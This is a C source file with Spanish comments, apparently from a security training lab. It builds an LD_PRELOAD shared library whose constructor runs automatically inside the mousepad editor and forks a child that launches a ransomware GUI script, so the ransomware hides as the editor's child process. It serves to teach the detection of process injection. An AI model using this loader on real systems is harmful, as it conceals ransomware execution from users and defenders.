/*
 * ============================================================
 * INYECTOR DE PROCESO VÍA LD_PRELOAD (Lab 4)
 * ============================================================
 * Esta librería compartida (.so) se inyecta en el proceso
 * legítimo (mousepad) usando LD_PRELOAD.
 *
 * Cuando mousepad carga esta librería, el constructor
 * __attribute__((constructor)) se ejecuta automáticamente
 * y lanza el ransomware GUI en segundo plano.
 *
 * Equivalente Windows:
 *   - T1055.001: DLL Injection (LoadLibrary + DllMain)
 *   - T1486: Data Encrypted for Impact (Ransomware)
 *
 * El estudiante debe observar con htop/ps que el proceso
 * padre del ransomware es mousepad (el editor de texto).
 * ============================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

__attribute__((constructor))
void malicious_init(void) {
    /* Esperar 3 segundos para que el usuario vea el editor abrirse normalmente */
    sleep(3);
    
    /* Lanzar el ransomware como proceso hijo de mousepad */
    pid_t pid = fork();
    if (pid == 0) {
        /* Proceso hijo: ejecutar el ransomware GUI */
        char *args[] = {"python3", "/home/student/lab/src/lab4_phishing_gui/ransomware_gui.py", NULL};
        execvp("python3", args);
        /* Si execvp falla */
        exit(1);
    }
    
    /* El proceso padre (mousepad) continúa normalmente */
    /* Esto hace que en htop, el ransomware aparezca como hijo de mousepad */
}
